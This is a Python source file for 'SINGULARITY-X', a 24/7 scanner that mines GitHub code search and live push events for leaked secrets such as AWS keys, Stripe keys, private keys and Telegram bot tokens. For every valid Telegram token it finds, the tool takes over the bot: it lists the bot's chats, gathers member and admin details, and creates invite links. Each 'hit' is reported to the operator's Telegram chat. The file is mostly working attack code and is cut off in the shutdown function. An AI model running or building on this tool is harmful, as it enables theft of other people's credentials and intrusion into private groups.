#!/usr/bin/env python3
"""
SINGULARITY-X ULTIMATE v4.0 - 24/7 PRODUCTION EDITION
Enterprise-grade, self-healing, continuous operation scanner
Auto-recovery | Health monitoring | Zero-downtime scanning
"""

import asyncio
import aiohttp
import aiosqlite
import re
import random
import json
import hashlib
import time
import os
import sys
import signal
import logging
import psutil
from datetime import datetime, timedelta
from urllib.parse import quote
from telethon import TelegramClient
from telethon.errors import FloodWaitError, RPCError
from aiolimiter import AsyncLimiter
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from contextlib import asynccontextmanager
import aiofiles
from collections import deque

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('singularity.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('SingularityX')

# Config import with fallback
try:
    from config import Config
    logger.info("[✓] Configuration loaded successfully")
except ImportError:
    logger.error("""[!] Create config.py:
class Config:
    API_ID = 12345
    API_HASH = "your_api_hash"
    BOT_TOKEN = "your_bot_token"
    LOG_CHAT = -1001234567890
    GH_TOKENS = ["ghp_token1", "ghp_token2"]
    ADMIN_USERS = [123456789]  # For admin notifications
""")
    sys.exit(1)

# =============================================================================
# CONFIGURATION
# =============================================================================

@dataclass
class ScanConfig:
    # Performance
    REQUESTS_PER_SECOND: int = 5000
    MAX_CONCURRENT: int = 500
    BATCH_SIZE: int = 75
    
    # Reliability
    MAX_RETRIES: int = 10
    RETRY_DELAY: float = 3.0
    CIRCUIT_BREAKER_THRESHOLD: int = 5
    CIRCUIT_BREAKER_TIMEOUT: int = 60
    
    # Scanning depth
    DEEP_BLAME_DEPTH: int = 50
    MAX_FILE_SIZE_MB: int = 10
    
    # 24/7 Operation
    HEALTH_CHECK_INTERVAL: int = 30
    STATS_INTERVAL: int = 300
    MEMORY_LIMIT_MB: int = 2048
    RESTART_ON_STALL: bool = True
    STALL_TIMEOUT: int = 300
    
    # Notifications
    LIVE_NOTIFICATIONS: bool = True
    NOTIFICATION_COOLDOWN: int = 30
    ADMIN_ALERTS: bool = True

SCAN_CFG = ScanConfig()

# Enhanced token patterns
TOKEN_PATTERNS = {
    'telegram_bot': r'[0-9]{8,10}:[a-zA-Z0-9_-]{35,40}',
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret': r'["\']?(aws_secret_access_key|secret)["\']?\s*[:=]\s*["\']?[a-zA-Z0-9/+=]{40}',
    'google_api': r'AIza[0-9A-Za-z_-]{35}',
    'google_oauth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
    'slack_token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}',
    'slack_webhook': r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8,}/[a-zA-Z0-9_]{24}',
    'discord_token': r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
    'discord_webhook': r'https://discord\.com/api/webhooks/[0-9]{18,20}/[a-zA-Z0-9_-]{68}',
    'stripe_key': r'sk_live_[0-9a-zA-Z]{24}',
    'github_token': r'ghp_[a-zA-Z0-9]{36}',
    'generic_api_key': r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?[a-zA-Z0-9_-]{32,64}',
    'jwt_token': r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
    'password_pattern': r'(?i)(password|passwd|pwd)\s*[:=]\s*["\'][^"\']{6,50}["\']',
    'connection_string': r'(mysql|postgres|mongodb|redis)://[^\s"<>]+',
    'private_key': r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
}

EXTENSIONS = [
    'env', 'php', 'js', 'json', 'yml', 'yaml', 'py', 'sh', 'sql', 'ini', 'conf',
    'bak', 'txt', 'log', 'config', 'xml', 'toml', 'tf', 'tfvars', 'properties',
    'pem', 'key', 'p12', 'pfx', 'htaccess', 'htpasswd', 'env.local', 'secret'
]

KEYWORDS = [
    'bot_token', 'api_key', 'api_secret', 'secret_key', 'private_key',
    'password', 'aws_access', 'github_token', 'stripe_key', 'mongodb_uri',
    'connection_string', 'DATABASE_URL', 'REDIS_URL'
]

GITHUB_DORKS = [
    'extension:env DB_PASSWORD', 'extension:env DATABASE_URL',
    'extension:yml password', 'extension:json api_key',
    'extension:py BOT_TOKEN', 'filename:.htpasswd',
    'filename:id_rsa', 'filename:.p12', 'path:.env',
    'extension:log password', 'extension:tfvars secret',
    'filename:credentials.json', 'extension:xml password',
    'extension:properties database', 'filename:config.ini',
]

# Global state with thread-safety
class StateManager:
    def __init__(self):
        self.processed_tokens: Set[str] = set()
        self.processed_urls: Set[str] = set()
        self.notification_cache: Dict[str, float] = {}
        self.stats = {
            'requests': 0, 'tokens_found': 0, 'valid_tokens': 0,
            'errors': 0, 'retries': 0, 'rate_limits': 0,
            'start_time': time.time(), 'last_hit': 0,
            'hits_sent': 0, 'scans_completed': 0
        }
        self.health_status = 'HEALTHY'
        self.last_activity = time.time()
        self.circuit_breakers: Dict[str, Dict] = {}
        
    def update_activity(self):
        self.last_activity = time.time()
        
    def check_stall(self) -> bool:
        return (time.time() - self.last_activity) > SCAN_CFG.STALL_TIMEOUT
    
    def check_circuit(self, service: str) -> bool:
        """Check if circuit breaker is open"""
        cb = self.circuit_breakers.get(service, {'failures': 0, 'last_failure': 0})
        if cb['failures'] >= SCAN_CFG.CIRCUIT_BREAKER_THRESHOLD:
            if time.time() - cb['last_failure'] < SCAN_CFG.CIRCUIT_BREAKER_TIMEOUT:
                return False  # Circuit open
            else:
                # Reset circuit
                self.circuit_breakers[service] = {'failures': 0, 'last_failure': 0}
        return True
    
    def record_failure(self, service: str):
        cb = self.circuit_breakers.get(service, {'failures': 0, 'last_failure': 0})
        cb['failures'] += 1
        cb['last_failure'] = time.time()
        self.circuit_breakers[service] = cb

state = StateManager()

# =============================================================================
# ASYNC DATABASE
# =============================================================================

class AsyncDatabase:
    def __init__(self, db_path="singularity_24x7.db"):
        self.db_path = db_path
        self.pool = None
        
    async def initialize(self):
        """Initialize async database"""
        self.pool = await aiosqlite.connect(self.db_path)
        await self._create_tables()
        logger.info("[✓] Database initialized")
        
    async def _create_tables(self):
        await self.pool.execute('''
            CREATE TABLE IF NOT EXISTS tokens (
                token_hash TEXT PRIMARY KEY,
                token_type TEXT,
                raw_token TEXT,
                source_url TEXT,
                source_method TEXT,
                found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                validated INTEGER DEFAULT 0,
                bot_username TEXT,
                bot_id TEXT,
                severity TEXT DEFAULT 'unknown',
                exploit_count INTEGER DEFAULT 0
            )
        ''')
        
        await self.pool.execute('''
            CREATE TABLE IF NOT EXISTS groups (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                token_hash TEXT,
                chat_id TEXT,
                chat_type TEXT,
                title TEXT,
                invite_link TEXT,
                member_count INTEGER,
                admins TEXT,
                discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        await self.pool.execute('''
            CREATE TABLE IF NOT EXISTS hits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                token_hash TEXT,
                bot_username TEXT,
                groups_count INTEGER,
                invite_links TEXT,
                hit_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        await self.pool.execute('''
            CREATE TABLE IF NOT EXISTS scan_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_type TEXT,
                query TEXT,
                results_count INTEGER,
                scan_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                duration_ms INTEGER
            )
        ''')
        
        await self.pool.execute('''
            CREATE TABLE IF NOT EXISTS health_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                status TEXT,
                memory_mb REAL,
                requests INTEGER,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        await self.pool.commit()
        
    async def insert_token(self, token: str, token_type: str, source: str, method: str) -> bool:
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        try:
            await self.pool.execute(
                'INSERT INTO tokens (token_hash, token_type, raw_token, source_url, source_method) VALUES (?, ?, ?, ?, ?)',
                (token_hash, token_type, token, source, method)
            )
            await self.pool.commit()
            return True
        except Exception:
            return False
    
    async def update_validation(self, token: str, valid: bool, bot_data: dict):
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        await self.pool.execute(
            'UPDATE tokens SET validated=?, bot_username=?, bot_id=?, severity=? WHERE token_hash=?',
            (1 if valid else 0, bot_data.get('username'), str(bot_data.get('id')),
             'critical' if valid else 'invalid', token_hash)
        )
        await self.pool.commit()
    
    async def insert_group(self, token: str, chat_id: str, chat_type: str, 
                          title: str, invite_link: str = None, member_count: int = 0, admins: str = ''):
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        await self.pool.execute(
            'INSERT INTO groups (token_hash, chat_id, chat_type, title, invite_link, member_count, admins) VALUES (?, ?, ?, ?, ?, ?, ?)',
            (token_hash, chat_id, chat_type, title, invite_link, member_count, admins)
        )
        await self.pool.commit()
    
    async def record_hit(self, token: str, bot_username: str, groups_count: int, invite_links: List[str]):
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        await self.pool.execute(
            'INSERT INTO hits (token_hash, bot_username, groups_count, invite_links) VALUES (?, ?, ?, ?)',
            (token_hash, bot_username, groups_count, json.dumps(invite_links))
        )
        await self.pool.commit()
    
    async def record_scan(self, scan_type: str, query: str, results: int, duration_ms: int):
        await self.pool.execute(
            'INSERT INTO scan_history (scan_type, query, results_count, duration_ms) VALUES (?, ?, ?, ?)',
            (scan_type, query, results, duration_ms)
        )
        await self.pool.commit()
    
    async def record_health(self, status: str, memory_mb: float, requests: int):
        await self.pool.execute(
            'INSERT INTO health_logs (status, memory_mb, requests) VALUES (?, ?, ?)',
            (status, memory_mb, requests)
        )
        await self.pool.commit()
    
    async def get_stats(self) -> dict:
        stats = {}
        async with self.pool.execute('SELECT COUNT(*) FROM tokens') as cursor:
            stats['tokens'] = (await cursor.fetchone())[0]
        async with self.pool.execute('SELECT COUNT(*) FROM tokens WHERE validated=1') as cursor:
            stats['valid'] = (await cursor.fetchone())[0]
        async with self.pool.execute('SELECT COUNT(*) FROM groups') as cursor:
            stats['groups'] = (await cursor.fetchone())[0]
        async with self.pool.execute('SELECT COUNT(*) FROM hits') as cursor:
            stats['hits'] = (await cursor.fetchone())[0]
        return stats
    
    async def close(self):
        await self.pool.close()

db = AsyncDatabase()

# =============================================================================
# TELEGRAM NOTIFICATION SYSTEM
# =============================================================================

class TelegramNotifier:
    def __init__(self):
        self.client: Optional[TelegramClient] = None
        self.connected = False
        self.message_queue = asyncio.Queue()
        self.processing = False
        
    async def initialize(self) -> bool:
        """Initialize with retry logic"""
        for attempt in range(5):
            try:
                self.client = TelegramClient('singularity_24x7', Config.API_ID, Config.API_HASH)
                await self.client.start(bot_token=Config.BOT_TOKEN)
                self.connected = True
                me = await self.client.get_me()
                logger.info(f"[✓] Telegram connected: @{me.username}")
                
                # Start message processor
                asyncio.create_task(self._process_queue())
                return True
            except FloodWaitError as e:
                logger.warning(f"[⏱️] Flood wait: {e.seconds}s")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                logger.error(f"[✗] Telegram connect failed (attempt {attempt+1}): {e}")
                await asyncio.sleep(5)
        return False
    
    async def _process_queue(self):
        """Process message queue"""
        self.processing = True
        while self.processing:
            try:
                msg_data = await asyncio.wait_for(self.message_queue.get(), timeout=1.0)
                await self._send_immediate(**msg_data)
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.error(f"[✗] Queue processing error: {e}")
    
    async def _send_immediate(self, text: str, chat_id: int = None, priority: bool = False):
        """Send message immediately"""
        if not self.connected:
            return
        
        chat_id = chat_id or Config.LOG_CHAT
        
        try:
            if len(text) > 4000:
                chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
                for chunk in chunks:
                    await self.client.send_message(chat_id, chunk)
                    await asyncio.sleep(0.5 if not priority else 0.1)
            else:
                await self.client.send_message(chat_id, text)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            await self._send_immediate(text, chat_id, priority)
        except Exception as e:
            logger.error(f"[✗] Send failed: {e}")
    
    async def queue_message(self, text: str, chat_id: int = None, priority: bool = False):
        """Queue message for sending"""
        await self.message_queue.put({'text': text, 'chat_id': chat_id, 'priority': priority})
    
    async def send_hit(self, token: str, bot_data: dict, intelligence: dict, source: str, method: str):
        """Send hit notification"""
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:16]
        last_time = state.notification_cache.get(token_hash, 0)
        
        if time.time() - last_time < SCAN_CFG.NOTIFICATION_COOLDOWN:
            return
        
        state.notification_cache[token_hash] = time.time()
        state.stats['hits_sent'] += 1
        state.stats['last_hit'] = time.time()
        
        groups = intelligence.get('groups', [])
        invite_count = len([g for g in groups if g.get('invite_link')])
        
        hit_msg = f"""
🔥 **LIVE HIT - {datetime.now().strftime('%H:%M:%S')}** 🔥

👤 Bot: @{bot_data.get('username', 'N/A')}
🆔 ID: `{bot_data.get('id', 'N/A')}`
🏰 Groups: {len(groups)} | 🔗 Invites: {invite_count}

🔑 Token: `{token[:25]}...{token[-10:]}`

🔗 Source: `{method}`
{source[:200]}

⚠️ Can Read All: {'🔴 YES' if bot_data.get('can_read_all_group_messages') else '❌'}
⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        await self.queue_message(hit_msg, priority=True)
        logger.info(f"[🔔] Hit queued: @{bot_data.get('username')}")
    
    async def send_stats(self):
        """Send statistics"""
        runtime = time.time() - state.stats['start_time']
        db_stats = await db.get_stats()
        
        stats_msg = f"""
📊 **SINGULARITY-X 24/7 STATUS**

⏱️ Uptime: {int(runtime/3600)}h {int((runtime%3600)/60)}m

📈 Performance:
  Requests: {state.stats['requests']:,}
  Tokens: {state.stats['tokens_found']:,}
  Valid: {state.stats['valid_tokens']:,}
  Hits: {state.stats['hits_sent']:,}
  Retries: {state.stats['retries']:,}

💾 Database:
  Tokens: {db_stats.get('tokens', 0):,}
  Valid: {db_stats.get('valid', 0):,}
  Groups: {db_stats.get('groups', 0):,}
  Total Hits: {db_stats.get('hits', 0):,}

⚡ Status: {state.health_status}
"""
        await self.queue_message(stats_msg)
    
    async def send_alert(self, alert_type: str, message: str):
        """Send admin alert"""
        if not SCAN_CFG.ADMIN_ALERTS or not hasattr(Config, 'ADMIN_USERS'):
            return
        
        alert_msg = f"""
⚠️ **ADMIN ALERT: {alert_type}**

{message}

Time: {datetime.now().isoformat()}
"""
        for admin_id in Config.ADMIN_USERS:
            await self.queue_message(alert_msg, chat_id=admin_id, priority=True)
    
    async def close(self):
        self.processing = False
        if self.client:
            await self.client.disconnect()

notifier = TelegramNotifier()

# =============================================================================
# TELEGRAM EXPLOITER
# =============================================================================

class TelegramExploiter:
    async def validate_token(self, session: aiohttp.ClientSession, token: str) -> Tuple[bool, dict]:
        if not state.check_circuit('telegram_api'):
            return False, {}
        
        try:
            async with limiter:
                async with session.get(
                    f"https://api.telegram.org/bot{token}/getMe",
                    timeout=aiohttp.ClientTimeout(total=15),
                    ssl=False
                ) as r:
                    state.stats['requests'] += 1
                    state.update_activity()
                    
                    if r.status == 401:
                        return False, {}
                    if r.status == 429:
                        state.record_failure('telegram_api')
                        return False, {}
                    if r.status == 200:
                        data = await r.json()
                        return data.get('ok', False), data
                    return False, {}
        except Exception as e:
            state.stats['errors'] += 1
            return False, {}
    
    async def get_updates(self, session: aiohttp.ClientSession, token: str, limit: int = 100) -> dict:
        try:
            async with limiter:
                async with session.get(
                    f"https://api.telegram.org/bot{token}/getUpdates?limit={limit}",
                    timeout=aiohttp.ClientTimeout(total=20),
                    ssl=False
                ) as r:
                    state.stats['requests'] += 1
                    if r.status == 200:
                        return await r.json()
                    return {}
        except:
            return {}
    
    async def get_chat_info(self, session: aiohttp.ClientSession, token: str, chat_id) -> dict:
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getChat?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as r:
                if r.status == 200:
                    return await r.json()
                return {}
        except:
            return {}
    
    async def get_admins(self, session: aiohttp.ClientSession, token: str, chat_id) -> list:
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getChatAdministrators?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result', [])
                return []
        except:
            return []
    
    async def get_member_count(self, session: aiohttp.ClientSession, token: str, chat_id) -> int:
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getChatMemberCount?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result', 0)
                return 0
        except:
            return 0
    
    async def export_invite(self, session: aiohttp.ClientSession, token: str, chat_id) -> Optional[str]:
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/exportChatInviteLink?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result')
                return None
        except:
            return None
    
    async def exploit(self, session: aiohttp.ClientSession, token: str, source: str, method: str) -> Optional[dict]:
        if token in state.processed_tokens:
            return None
        state.processed_tokens.add(token)
        
        # Check DB
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        async with db.pool.execute('SELECT validated FROM tokens WHERE token_hash=?', (token_hash,)) as cursor:
            row = await cursor.fetchone()
            if row and row[0]:
                return None
        
        # Validate
        is_valid, bot_info = await self.validate_token(session, token)
        
        if not is_valid:
            await db.insert_token(token, 'telegram_bot', source, method)
            await db.update_validation(token, False, {})
            return None
        
        # VALID BOT!
        state.stats['valid_tokens'] += 1
        bot_data = bot_info.get('result', {})
        bot_username = bot_data.get('username', 'unknown')
        bot_id = bot_data.get('id', 0)
        
        logger.info(f"[🔥🔥🔥] VALID BOT: @{bot_username}")
        
        await db.insert_token(token, 'telegram_bot', source, method)
        await db.update_validation(token, True, bot_data)
        
        # Intelligence gathering
        intel = {'bot_id': bot_id, 'bot_username': bot_username, 'groups': [], 'invite_links': []}
        
        updates = await self.get_updates(session, token, limit=100)
        processed_chats = set()
        
        if updates.get('ok'):
            for update in updates.get('result', []):
                if 'message' in update:
                    msg = update['message']
                    chat = msg.get('chat', {})
                    chat_id = chat.get('id')
                    
                    if chat_id and chat_id not in processed_chats:
                        processed_chats.add(chat_id)
                        chat_type = chat.get('type', 'unknown')
                        chat_title = chat.get('title') or chat.get('username') or f"Chat_{chat_id}"
                        
                        # Parallel info gathering
                        chat_info, member_count, invite_link, admins = await asyncio.gather(
                            self.get_chat_info(session, token, chat_id),
                            self.get_member_count(session, token, chat_id),
                            self.export_invite(session, token, chat_id),
                            self.get_admins(session, token, chat_id) if chat_type in ['group', 'supergroup', 'channel'] 
                            else asyncio.sleep(0)
                        )
                        
                        if isinstance(admins, list):
                            admin_list = [{'username': a.get('user', {}).get('username'), 
                                          'status': a.get('status')} for a in admins]
                        else:
                            admin_list = []
                        
                        group_data = {
                            'chat_id': chat_id, 'type': chat_type, 'title': chat_title,
                            'invite_link': invite_link, 'member_count': member_count,
                            'admins': admin_list,
                            'description': chat_info.get('result', {}).get('description', '')
                        }
                        
                        intel['groups'].append(group_data)
                        await db.insert_group(token, str(chat_id), chat_type, chat_title, 
                                             invite_link, member_count, json.dumps(admin_list))
                        
                        if invite_link:
                            intel['invite_links'].append(invite_link)
        
        # Record hit
        await db.record_hit(token, bot_username, len(intel['groups']), intel['invite_links'])
        
        # Send notifications
        if SCAN_CFG.LIVE_NOTIFICATIONS:
            await notifier.send_hit(token, bot_data, intel, source, method)
        
        # Save report
        await self._save_report(token, bot_data, intel, source, method)
        
        return intel
    
    async def _save_report(self, token: str, bot_data: dict, intel: dict, source: str, method: str):
        try:
            os.makedirs('reports', exist_ok=True)
            filename = f"reports/{bot_data.get('username', 'unknown')}_{int(time.time())}.json"
            
            report = {
                'timestamp': datetime.now().isoformat(),
                'token': token,
                'bot': bot_data,
                'intelligence': intel,
                'source': source,
                'method': method
            }
            
            async with aiofiles.open(filename, 'w') as f:
                await f.write(json.dumps(report, indent=2))
            
            logger.info(f"[💾] Report saved: {filename}")
        except Exception as e:
            logger.error(f"[✗] Save failed: {e}")

exploiter = TelegramExploiter()

# =============================================================================
# GITHUB SCANNER - ENTERPRISE GRADE
# =============================================================================

class GitHubScanner:
    def __init__(self):
        self.token_index = 0
        self.failed_tokens = set()
        self.last_success = time.time()
        
    def get_token(self) -> str:
        tokens = [t for t in Config.GH_TOKENS if t not in self.failed_tokens]
        if not tokens:
            self.failed_tokens.clear()
            tokens = Config.GH_TOKENS
        token = tokens[self.token_index % len(tokens)]
        self.token_index += 1
        return token.strip()
    
    async def request(self, session: aiohttp.ClientSession, url: str, retries: int = 0) -> Tuple[int, Any]:
        if retries >= SCAN_CFG.MAX_RETRIES:
            return 0, None
        
        if not state.check_circuit('github_api'):
            await asyncio.sleep(30)
        
        token = self.get_token()
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Singularity-X-24x7/4.0"
        }
        
        try:
            async with session.get(url, headers=headers, 
                                   timeout=aiohttp.ClientTimeout(total=45),
                                   ssl=False) as r:
                state.stats['requests'] += 1
                state.update_activity()
                
                if r.status == 401:
                    self.failed_tokens.add(token)
                    state.record_failure('github_api')
                    return await self.request(session, url, retries + 1)
                
                if r.status == 403 or r.status == 429:
                    state.stats['rate_limits'] += 1
                    state.record_failure('github_api')
                    reset_time = int(r.headers.get('X-RateLimit-Reset', 0))
                    wait = max(reset_time - time.time(), 60) if reset_time > time.time() else 60
                    logger.warning(f"[⏱️] GitHub rate limit, waiting {wait:.0f}s")
                    await asyncio.sleep(min(wait, 180))
                    return await self.request(session, url, retries + 1)
                
                if r.status == 200:
                    self.last_success = time.time()
                    return r.status, await r.json()
                
                if r.status >= 500:
                    await asyncio.sleep(5)
                    return await self.request(session, url, retries + 1)
                
                return r.status, None
                
        except asyncio.TimeoutError:
            state.stats['retries'] += 1
            await asyncio.sleep(SCAN_CFG.RETRY_DELAY * (retries + 1))
            return await self.request(session, url, retries + 1)
        except Exception as e:
            state.stats['errors'] += 1
            await asyncio.sleep(SCAN_CFG.RETRY_DELAY)
            return await self.request(session, url, retries + 1)
    
    async def search_code(self, session: aiohttp.ClientSession, query: str) -> List[dict]:
        results = []
        start_time = time.time()
        
        for page in range(1, 6):
            url = f"https://api.github.com/search/code?q={quote(query)}&sort=indexed&order=desc&per_page=100&page={page}"
            status, data = await self.request(session, url)
            
            if status == 200 and data:
                items = data.get('items', [])
                if not items:
                    break
                results.extend(items)
            else:
                break
        
        duration = int((time.time() - start_time) * 1000)
        await db.record_scan('code_search', query, len(results), duration)
        return results
    
    async def get_events(self, session: aiohttp.ClientSession) -> List[dict]:
        url = "https://api.github.com/events"
        status, data = await self.request(session, url)
        return data if status == 200 and isinstance(data, list) else []
    
    async def get_commit(self, session: aiohttp.ClientSession, url: str) -> dict:
        status, data = await self.request(session, url)
        return data if status == 200 else {}
    
    async def get_commits(self, session: aiohttp.ClientSession, repo: str, path: str) -> List[dict]:
        url = f"https://api.github.com/repos/{repo}/commits?path={quote(path)}&per_page={SCAN_CFG.DEEP_BLAME_DEPTH}"
        status, data = await self.request(session, url)
        return data if status == 200 and isinstance(data, list) else []
    
    async def get_raw(self, session: aiohttp.ClientSession, repo: str, sha: str, path: str) -> str:
        url = f"https://raw.githubusercontent.com/{repo}/{sha}/{path}"
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=45), ssl=False) as r:
                return await r.text() if r.status == 200 else ""
        except:
            return ""
    
    async def deep_scan(self, session: aiohttp.ClientSession, item: dict):
        repo = item.get('repository', {}).get('full_name')
        path = item.get('path')
        html_url = item.get('html_url', '')
        
        if not repo or not path:
            return
        
        commits = await self.get_commits(session, repo, path)
        
        for commit in commits[:SCAN_CFG.DEEP_BLAME_DEPTH]:
            sha = commit.get('sha')
            if not sha:
                continue
            
            content = await self.get_raw(session, repo, sha, path)
            if not content or len(content) > SCAN_CFG.MAX_FILE_SIZE_MB * 1024 * 1024:
                continue
            
            for token_type, pattern in TOKEN_PATTERNS.items():
                matches = set(re.findall(pattern, content))
                
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0] if match else ""
                    if not match or len(match) < 10:
                        continue
                    
                    state.stats['tokens_found'] += 1
                    
                    if token_type == 'telegram_bot':
                        await exploiter.exploit(session, match, html_url, f"DEEP:{sha[:7]}")
                    else:
                        await db.insert_token(match, token_type, html_url, f"DEEP:{sha[:7]}")
        
        state.stats['scans_completed'] += 1

gh_scanner = GitHubScanner()

# =============================================================================
# 24/7 SCANNING MODULES
# =============================================================================

limiter = AsyncLimiter(SCAN_CFG.REQUESTS_PER_SECOND, 1)

async def realtime_worker(session: aiohttp.ClientSession, worker_id: int):
    """24/7 Real-time event worker"""
    logger.info(f"[🔄] Realtime worker {worker_id} started")
    
    while True:
        try:
            if not state.check_circuit('github_api'):
                await asyncio.sleep(60)
                continue
            
            events = await gh_scanner.get_events(session)
            
            if events:
                tasks = []
                for event in events:
                    if event.get('type') == 'PushEvent':
                        repo = event.get('repo', {}).get('name', '')
                        for commit in event.get('payload', {}).get('commits', []):
                            tasks.append(process_commit(session, commit.get('url', ''), repo))
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
            
            await asyncio.sleep(2)
            
        except Exception as e:
            logger.error(f"[✗] Realtime worker {worker_id} error: {e}")
            await asyncio.sleep(10)

async def process_commit(session: aiohttp.ClientSession, commit_url: str, repo: str):
    """Process commit for secrets"""
    if not commit_url:
        return
    
    try:
        commit_data = await gh_scanner.get_commit(session, commit_url)
        
        for file in commit_data.get('files', []):
            patch = file.get('patch', '')
            filename = file.get('filename', '')
            
            ext = filename.split('.')[-1] if '.' in filename else ''
            if ext in EXTENSIONS or any(k in filename.lower() for k in KEYWORDS):
                for token_type, pattern in TOKEN_PATTERNS.items():
                    matches = set(re.findall(pattern, patch))
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0]
                        
                        state.stats['tokens_found'] += 1
                        
                        if token_type == 'telegram_bot':
                            await exploiter.exploit(session, match, f"https://github.com/{repo}", "PUSH")
                        else:
                            await db.insert_token(match, token_type, f"https://github.com/{repo}", "PUSH")
    except Exception as e:
        logger.debug(f"[✗] Process commit error: {e}")

async def search_worker(session: aiohttp.ClientSession, worker_id: int):
    """24/7 Search worker"""
    logger.info(f"[🔍] Search worker {worker_id} started")
    
    queries = GITHUB_DORKS.copy()
    for ext in EXTENSIONS[:10]:
        for key in KEYWORDS[:5]:
            queries.append(f"extension:{ext}+{key}")
    
    while True:
        try:
            random.shuffle(queries)
            
            for query in queries:
                if not state.check_circuit('github_api'):
                    await asyncio.sleep(60)
                    continue
                
                logger.info(f"[🔍] W{worker_id}: {query[:50]}...")
                items = await gh_scanner.search_code(session, query)
                
                if items:
                    logger.info(f"[+] W{worker_id}: {len(items)} results")
                    
                    # Process batches
                    for i in range(0, len(items), SCAN_CFG.BATCH_SIZE):
                        batch = items[i:i+SCAN_CFG.BATCH_SIZE]
                        tasks = [gh_scanner.deep_scan(session, item) for item in batch]
                        await asyncio.gather(*tasks, return_exceptions=True)
                        await asyncio.sleep(0.5)
                
                await asyncio.sleep(random.uniform(3, 8))
            
            await asyncio.sleep(30)
            
        except Exception as e:
            logger.error(f"[✗] Search worker {worker_id} error: {e}")
            await asyncio.sleep(30)

async def health_monitor():
    """24/7 Health monitoring"""
    logger.info("[🏥] Health monitor started")
    
    while True:
        try:
            await asyncio.sleep(SCAN_CFG.HEALTH_CHECK_INTERVAL)
            
            # Check memory
            process = psutil.Process(os.getpid())
            memory_mb = process.memory_info().rss / 1024 / 1024
            
            # Check for stalls
            if state.check_stall():
                logger.warning("[⚠️] Activity stall detected!")
                state.health_status = 'STALLED'
                if SCAN_CFG.RESTART_ON_STALL:
                    await notifier.send_alert('STALL DETECTED', 'Scanner activity stalled, initiating recovery...')
                    state.update_activity()  # Reset to prevent spam
            elif memory_mb > SCAN_CFG.MEMORY_LIMIT_MB:
                logger.warning(f"[⚠️] High memory usage: {memory_mb:.0f}MB")
                state.health_status = 'HIGH_MEMORY'
                await notifier.send_alert('HIGH MEMORY', f'Using {memory_mb:.0f}MB RAM')
            else:
                state.health_status = 'HEALTHY'
            
            # Record health
            await db.record_health(state.health_status, memory_mb, state.stats['requests'])
            
        except Exception as e:
            logger.error(f"[✗] Health monitor error: {e}")

async def stats_reporter():
    """Periodic stats reporting"""
    while True:
        try:
            await asyncio.sleep(SCAN_CFG.STATS_INTERVAL)
            await notifier.send_stats()
            
            # Console log
            runtime = time.time() - state.stats['start_time']
            logger.info(f"[📊] Uptime: {int(runtime/3600)}h | Requests: {state.stats['requests']:,} | "
                       f"Tokens: {state.stats['tokens_found']:,} | Valid: {state.stats['valid_tokens']:,} | "
                       f"Hits: {state.stats['hits_sent']:,}")
        except Exception as e:
            logger.error(f"[✗] Stats error: {e}")

# =============================================================================
# MAIN - 24/7 OPERATION
# =============================================================================

async def shutdown(signal_name):
    """Graceful shutdown"""
    logger.info(f"[🛑] Received {signal_name}, shutting down gracefully...")
    state.health_status = 'SHUTTING_DOWN'
    
    try:
        await notifier.send_alert('SHUTDOWN', f'Received {signal_name}, shutting down...')
        await notifier.close()
        await db.close()
    except:
        pass
    
    stats = await db.get_stats()
